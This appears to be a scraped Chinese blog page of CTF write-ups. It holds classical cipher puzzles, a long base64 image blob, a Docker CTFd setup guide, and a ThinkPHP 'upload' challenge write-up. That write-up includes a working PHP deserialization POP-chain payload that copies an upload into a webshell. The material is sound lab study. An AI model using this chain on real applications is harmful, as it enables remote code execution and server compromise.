AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMjAyMTowMToxMCAyMjo0MDo1OQAyMDIxOjAxOjEwIDIyOjQwOjU5AAAAUgAwADAAVAAAAP/hCxdodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvADw/eHBhY2tldCBiZWdpbj0n77u/JyBpZD0nVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkJz8+DQo8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIj48cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPjxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSJ1dWlkOmZhZjViZGQ1LWJhM2QtMTFkYS1hZDMxLWQzM2Q3NTE4MmYxYiIgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIi8+PHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9InV1aWQ6ZmFmNWJkZDUtYmEzZC0xMWRhLWFkMzEtZDMzZDc1MTgyZjFiIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iPjx4bXA6Q3JlYXRlRGF0ZT4yMDIxLTAxLTEwVDIyOjQwOjU5LjQxMTwveG1wOkNyZWF0ZURhdGU+PC9yZGY6RGVzY3JpcHRpb24+PHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9InV1aWQ6ZmFmNWJkZDUtYmEzZC0xMWRhLWFkMzEtZDMzZDc1MTgyZjFiIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iPjxkYzpjcmVhdG9yPjxyZGY6U2VxIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+PHJkZjpsaT5SMDBUPC9yZGY6bGk+PC9yZGY6U2VxPg0KCQkJPC9kYzpjcmVhdG9yPjwvcmRmOkRlc2NyaXB0aW9uPjwvcmRmOlJERj48L3g6eG1wbWV0YT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgPD94cGFja2V0IGVuZD0ndyc/Pv/bAEMABwUFBgUEBwYFBggHBwgKEQsKCQkKFQ8QDBEYFRoZGBUYFxseJyEbHSUdFxgiLiIlKCkrLCsaIC8zLyoyJyorKv/bAEMBBwgICgkKFAsLFCocGBwqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKv/AABEIADMBcQMBIgACEQEDEQH/xAAfAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgv/xAC1EAACAQMDAgQDBQUEBAAAAX0BAgMABBEFEiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoWFxgZGiUmJygpKjQ1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4eLj5OXm5+jp6vHy8/T19vf4+fr/xAAfAQADAQEBAQEBAQEBAAAAAAAAAQIDBAUGBwgJCgv/xAC1EQACAQIEBAMEBwUEBAABAncAAQIDEQQFITEGEkFRB2FxEyIygQgUQpGhscEJIzNS8BVictEKFiQ04SXxFxgZGiYnKCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqCg4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2dri4+Tl5ufo6ery8/T19vf4+fr/2gAMAwEAAhEDEQA/APov7Ha/8+0P/fsUfY7X/n2h/wC/YqaigCH7Ha/8+0P/AH7FH2O1/wCfaH/v2KmooA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 一堆牛马乱码，没见过，看别人wp知道是base64转图片，还要加图片头data:image/jpg;base64 之后对照表就行了 你喜欢下棋吗 4423244324433534315412244543先横后竖转换得到”thisispolybius” 打开是这个 1234一种5bit的编码bugku里面的内容为小写bugku{11111 11001 00011 00111 01001 11011 10110 11111 10000 01110 11011 10110 11111 01001 00001} Baudot Code https://www.boxentriq.com/code-breaking/baudot-code解码即可 小山丘的秘密给了一个图片 还有一段话 123bugku{PLGTGBQHM}其中A=1，flag全为小写bugku{} hill（希尔密码） 需要三个参数，首先A=1就是提示字母表排列 一般从0开始 所以z就是0 第二个也就是加密的内容 第三个参数从棋盘上看 第一个也就是a 以此类推 就解除了答案 bugku{whatahill} EN-气泡上脚本就行 1234567from bubblepy import BubbleBabble#导入包bubblepystr='xivak-notuk-cupad-tarek-zesuk-zupid-taryk-zesak-cined-tetuk-nasuk-zoryd-tirak-zysek-zaryd-tyrik-nisyk-nenad-tituk-nysil-hepyd-tovak-zutik-cepyd-toral-husol-henud-titak-hesak-nyrud-tarik-netak-zapad-tupek-hysek-zuned-tytyk-zisuk-hyped-tymik-hysel-hepad-tomak-zysil-nunad-tytak-nirik-copud-tevok-zasyk-nypud-tyruk-niryk-henyd-tityk-zyral-nyred-taryk-zesek-corid-tipek-zysek-nunad-tytal-hitul-hepod-tovik-zurek-hupyd-tavil-hesuk-zined-tetuk-zatel-hopod-tevul-haruk-cupod-tavuk-zesol-ninid-tetok-nasyl-hopid-teryl-nusol-heped-tovuk-hasil-nenod-titek-zyryl-hiped-tivyk-cosok-zorud-tirel-hyrel-hinid-tetok-hirek-zyped-tyrel-hitul-nyrad-tarak-hotok-cuvux'#str是待解密字符Str=BubbleBabble()print(Str.decode(str)) 多次套娃 你以为是md5吗bci177a7a9c7udf69c248647b4dfc6fd84o 给了一串数字，其实就是考察对md5的理解 ctf中md5一般为32位小写字符 由[a-f][0-9]构成 删去i o u 再去解密 就可以了 bc177a7a9c7df69c248647b4dfc6fd84 flag{666666666666} Math&amp;English12345678910111213141511×3=sin(Π/6)+sin(Π/6)= 2×11=3×cos(2Π)=22×2=6×9=2.5×2=tan(Π) + 1 = 5×7=7×9-9=ln(e) + 2 =(6×6)-1=4×10 + cos(0) =26×2 =ln(e) × 10 +3 = 通过计算 得到了 21 33 1 22 3 44 54 5 1 35 54 3 35 41 52 13 为元音密码 对照即可解出密码 easy_crypto0010 0100 01 110 1111011 11 11111 010 000 0 001101 1010 111 100 0 001101 01111 000 001101 00 10 1 0 010 0 000 1 01111 10 11110 101011 1111101 猜想是摩斯密码 转换后 ..-. .-.. .- –. —-.– – —– .-. … . ..–.- -.-. — -.. . ..–.- .—- … ..–.- .. -. - . .-. . … - .—- -. —-. -.-.– —–.- http://www.hiencode.com/morse.html 解密即可","link":"/2021/10/14/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%B7%E9%A2%98/"},{"title":"强网杯upload","text":"登入以后首先是个页面 注册一个账号去登入 弹出了这个，好熟悉，thinkphp 登入之后是个文件上传的页面，尝试去上传一个php，发现不好使，(中间出现了一次报错，爆出了版本为5.1.35，去网上搜了exp，但是没有反序列化入口) 只能上传图片，用dirseach扫目录，发现是源码泄露 www.tar.gz 下载下来源码，进行审计，发现为mvc三层架构，去审计控制器里的源码 因为题目名字叫upload，那应该就是文件上传喽，先审profile里的代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;?phpnamespace app\\web\\controller;use think\\Controller;class Profile extends Controller{ public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __construct() { $this-&gt;checker=new Index(); $this-&gt;upload_menu=md5($_SERVER['REMOTE_ADDR']); @chdir(&quot;../public/upload&quot;); if(!is_dir($this-&gt;upload_menu)){ @mkdir($this-&gt;upload_menu); } @chdir($this-&gt;upload_menu); } public function upload_img(){ if($this-&gt;checker){ if(!$this-&gt;checker-&gt;login_check()){ $curr_url=&quot;http://&quot;.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].&quot;/index&quot;; $this-&gt;redirect($curr_url,302); exit(); } } if(!empty($_FILES)){ $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name']; $this-&gt;filename=md5($_FILES['upload_file']['name']).&quot;.png&quot;; $this-&gt;ext_check(); } if($this-&gt;ext) { if(getimagesize($this-&gt;filename_tmp)) { @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;; $this-&gt;update_img(); }else{ $this-&gt;error('Forbidden type!', url('../index')); } }else{ $this-&gt;error('Unknow file type!', url('../index')); } } public function update_img(){ $user_info=db('user')-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile['ID'])-&gt;find(); if(empty($user_info['img']) &amp;&amp; $this-&gt;img){ if(db('user')-&gt;where('ID',$user_info['ID'])-&gt;data([&quot;img&quot;=&gt;addslashes($this-&gt;img)])-&gt;update()){ $this-&gt;update_cookie(); $this-&gt;success('Upload img successful!', url('../home')); }else{ $this-&gt;error('Upload file failed!', url('../index')); } } } public function update_cookie(){ $this-&gt;checker-&gt;profile['img']=$this-&gt;img; cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600); } public function ext_check(){ $ext_arr=explode(&quot;.&quot;,$this-&gt;filename); $this-&gt;ext=end($ext_arr); if($this-&gt;ext==&quot;png&quot;){ return 1; }else{ return 0; } } public function __get($name) { return $this-&gt;except[$name]; } public function __call($name, $arguments) { if($this-&gt;{$name}){ $this-&gt;{$this-&gt;{$name}}($arguments); } }} 一个大类，重点关注upload_img方法 123456789101112131415161718192021222324252627public function upload_img(){ if($this-&gt;checker){ if(!$this-&gt;checker-&gt;login_check()){ $curr_url=&quot;http://&quot;.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].&quot;/index&quot;; $this-&gt;redirect($curr_url,302); exit(); } } if(!empty($_FILES)){ $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name']; $this-&gt;filename=md5($_FILES['upload_file']['name']).&quot;.png&quot;; $this-&gt;ext_check(); } if($this-&gt;ext) { if(getimagesize($this-&gt;filename_tmp)) { @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;; $this-&gt;update_img(); }else{ $this-&gt;error('Forbidden type!', url('../index')); } }else{ $this-&gt;error('Unknow file type!', url('../index')); } } 第二个判断，名字从$_FILE全局变量中取出，并且把后缀加上png，这里其实存在一个漏洞，如果不通过上传文件的接口去调用该方法，那么$FILES变量就为空，那么文件名就可控喽，那在下面就可以通过copy方法去生成文件，进而rce 那么究竟如何调用upload_img方法呢?一般这种考点就是反序列化了 先找反序列化入口，在index.php中有一反序列化点，且参数可控 123456789101112public function login_check(){ $profile=cookie('user'); if(!empty($profile)){ $this-&gt;profile=unserialize(base64_decode($profile)); $this-&gt;profile_db=db('user')-&gt;where(&quot;ID&quot;,intval($this-&gt;profile['ID']))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null){ return 1; }else{ return 0; } }} 下面回到Profile.php中，一般反序列化就是要找魔术方法，这个profile类里面没有wakeup或者destruct方法，那就得通过其他类去调用他。 他存在一个call方法，其中两个参数可控，所以就能调用upload_img方法了 123456public function __call($name, $arguments){ if($this-&gt;{$name}){ $this-&gt;{$this-&gt;{$name}}($arguments); }} 下面去寻找其他类中的destruct或者wakeup方法，可以看到在regeister类里面有一个destruct方法 123456public function __destruct(){ if(!$this-&gt;registed){ $this-&gt;checker-&gt;index(); }} 如果把checker赋值为profile类，而profile类中不存在index方法，那么就会调用call方法，而call方法进而get方法再进而调用 upload_img方法，完成pop链构造 这里着重讲下__call方法 1234567891011121314151617&lt;?phpclass TestCall{ public function __construct(){ } public function __call($method, $param){ echo $method; echo &quot;&lt;br&gt;&quot;; var_dump($param); echo &quot;call the call!&quot;; }}$test = new TestCall();$test-&gt;air(1,2,3); 输出结果为 可见call方法第一个参数为所调用方法的名称，第二个为传入的参数，，而且以数组的形式储存 弄清楚这个，就知道__call方法是如何调用 get方法了，首先是传入name，变成了 1$this-&gt;{$this-&gt;{index}}($arguments); 先计算花括号里面的值，调用了get方法，取到了我们存在数组里的upload_image方法然后变成了了 upload_image() 最后进行调用 payload: 1234567891011121314151617181920212223&lt;?phpnamespace app\\web\\controller;class Register{ public $checker; public $registed =0;//目的是过destruct里的if;}class Profile{ public $checker =0 ;//目的是绕过index类的检查，防止退出程序 public $filename_tmp=&quot;./upload/ea6cf191dc7eec7b0e43199e459204e5/fb5c81ed3a220004b71069645f112867.png&quot;; public $upload_menu; public $filename=&quot;upload/air.php&quot;; public $ext=1;//目的是过if来调用复制webshell public $img; public $except=array(&quot;index&quot;=&gt;&quot;upload_img&quot;);//目的是通过__get()魔术方法调用upload_Img函数}$a = new Register();$a-&gt;checker = new Profile();//目的是调用POP链$a-&gt;checker-&gt;checker=0;//调用pop链防止退出程序echo base64_encode(serialize($a));","link":"/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/"},{"title":"手把手挖Laravel链子","text":"","link":"/2021/10/22/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%8C%96Laravel%E9%93%BE%E5%AD%90/"},{"title":"手把手搭一个靶场并出题","text":"心血来潮搭建了一个靶场并出了人生中第一道CTF题，感觉挺有成就感，就写下这篇文章记录一下 Step1 初始化docker环境去购买一个云服务器(阿里云、腾讯云、华为云都可)，设置系统为Ubuntu20.04(我自己是这种版本，其他版本用我这种方法可能会报错) 123cd /rootvi init.sh 然后在init里面写入以下内容 1234567891011121314151617#!/bin/bash#更新系统sudo apt-get updatesudo apt-get upgrade#安装 docker和docker-composesudo apt install docker docker-compose zip#设置镜像加速器sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'{ &quot;registry-mirrors&quot;: [&quot;https://faalpdo3.mirror.aliyuncs.com&quot;]}EOFsudo systemctl daemon-reloadsudo systemctl restart docker 然后 1234chmod +x init.sh./init.sh 遇到问句就 y step2 搭建CTFd1.拉取CTFd在服务器面板里开放端口(我这里以8000为例) 直接利用docker拉取镜像 1docker run -p 8000:8000 -d ctfd/ctfd 然后去访问url+端口号 会有初始化的界面，去设置一下管理员员账号密码等一些配置信息即可 2.汉化ctfd 首先利用docker ps去查看id，然后利用id进入docker容器里面 1docker exec -it de6fe1167985 /bin/bash 先去下载汉化包，直接用git命令去拉取 12git clone https://github.com/Gu-f/CTFd_chinese_CN.git 12345切换到CTFd目录 删除主题rm -rf themes然后把下载好的主题以及对应的版本cp过来cp /opt/CTFd/CTFd_chinese_CN/V3.1.1/CTFd-3.1.1/CTFd/themes . 刷新下界面，就发现变成了中文，至此ctfd搭建完成 step3 出题之前去测试环境，都是直接用宝塔去搭建的本地服务，这种方法有时候会出现很大的问题，例如搭建的环境存在写shell的地方，你的服务器很容易就被别人当做肉鸡来抓，有很多这种情况，去fofa上一搜，就能抓到很多肉鸡 既然是出题，那就高端一点，利用dokcer去搭建环境，本次出题借鉴了一些别的比赛的源码，此题为天翼杯魔改的， 1.编写Dockerfile利用的是Dockerfile生成的images 